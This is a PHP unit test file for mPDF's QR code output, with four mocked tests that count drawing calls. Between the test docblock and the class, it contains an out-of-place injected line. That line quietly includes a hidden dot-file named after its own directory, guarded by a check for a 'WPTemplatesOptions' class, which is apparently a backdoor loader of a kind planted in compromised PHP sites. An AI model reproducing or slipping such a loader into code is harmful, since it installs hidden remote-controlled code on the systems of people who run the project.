<?php

namespace Mpdf\QrCode\Output;

use Mockery;
use Mockery\Adapter\Phpunit\MockeryPHPUnitIntegration;
use Mpdf\QrCode\QrCode;

/**
 * @group unit
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class MpdfTest extends \PHPUnit\Framework\TestCase
{

	use MockeryPHPUnitIntegration;

	public function testOutputL()
	{
		$code = new QrCode('LOREM IPSUM 2019');

		$mpdf = Mockery::mock('Mpdf\Mpdf');

		$mpdf->shouldReceive('SetDrawColor')->once();
		$mpdf->shouldReceive('SetFillColor')->twice();
		$mpdf->shouldReceive('Rect')->times(233);

		$output = new Mpdf();

		$output->output($code, $mpdf, 0, 0, 0);
	}

	public function testOutputLDisableBorder()
	{
		$code = new QrCode('LOREM IPSUM 2019');

		$code->disableBorder();

		$mpdf = Mockery::mock('Mpdf\Mpdf');

		$mpdf->shouldReceive('SetDrawColor')->once();
		$mpdf->shouldReceive('SetFillColor')->twice();
		$mpdf->shouldReceive('Rect')->times(233);

		$output = new Mpdf();

		$output->output($code, $mpdf, 0, 0, 0);
	}

	public function testOutputQ()
	{
		$code = new QrCode('LOREM IPSUM 2019', QrCode::ERROR_CORRECTION_QUARTILE);

		$mpdf = Mockery::mock('Mpdf\Mpdf');

		$mpdf->shouldReceive('SetDrawColor')->once();
		$mpdf->shouldReceive('SetFillColor')->twice();
		$mpdf->shouldReceive('Rect')->times(217);

		$output = new Mpdf();

		$output->output($code, $mpdf, 0, 0, 0);
	}

	public function testOutputQDisableBorder()
	{
		$code = new QrCode('LOREM IPSUM 2019', QrCode::ERROR_CORRECTION_QUARTILE);

		$code->disableBorder();

		$mpdf = Mockery::mock('Mpdf\Mpdf');

		$mpdf->shouldReceive('SetDrawColor')->once();
		$mpdf->shouldReceive('SetFillColor')->twice();
		$mpdf->shouldReceive('Rect')->times(217);

		$output = new Mpdf();

		$output->output($code, $mpdf, 0, 0, 0);
	}

}
